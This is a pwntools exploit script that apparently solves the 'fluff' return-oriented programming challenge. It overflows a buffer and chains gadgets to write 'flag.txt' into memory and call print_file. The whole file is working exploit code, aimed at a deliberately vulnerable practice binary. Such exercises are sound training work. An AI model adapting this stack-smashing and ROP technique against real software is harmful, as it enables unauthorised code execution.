#!/bin/python3

from pwn import *

elf = ELF("./fluff")
p = process(elf.path)

'''
# For debugging with r2
# ---------------------

pid = util.proc.pidof(p)[0]
print("The pid is " + str(pid))
util.proc.wait_for_debugger(pid)
'''

p.recvuntil(">")

flag = b"flag.txt"
flag_char_pos = []

# Find the address of all characters
for char in flag:
      pos = hex(read("./fluff").find(char) + elf.address)
      flag_char_pos.append(pos)

# Gadgets
pop_rdi = p64(0x004006a3)
stosb_gadget = p64(0x00400639)
xlatb_gadget = p64(0x00400628)
pop_rdx_rcx_add_rcx_bextr = p64(0x0040062a)

data_section = 0x00601028
print_file = p64(0x00400510)

# Payload
payload = b""
payload += b"A" * 40 # Padding

#---------------
current_rax = 0xb # initial rax

for i in range(8):
    payload += pop_rdx_rcx_add_rcx_bextr
    payload += p64(0x4000)
    payload += p64(int(flag_char_pos[i], 16) - current_rax - 0x3ef2) # Save on rbx the "table base address"

    current_rax = flag[i] # update rax

    payload += xlatb_gadget

    payload += pop_rdi
    payload += p64(data_section + i)

    payload += stosb_gadget

#---------------

payload += pop_rdi
payload += p64(data_section)
payload += print_file

p.sendline(payload)

print(p.recvall())

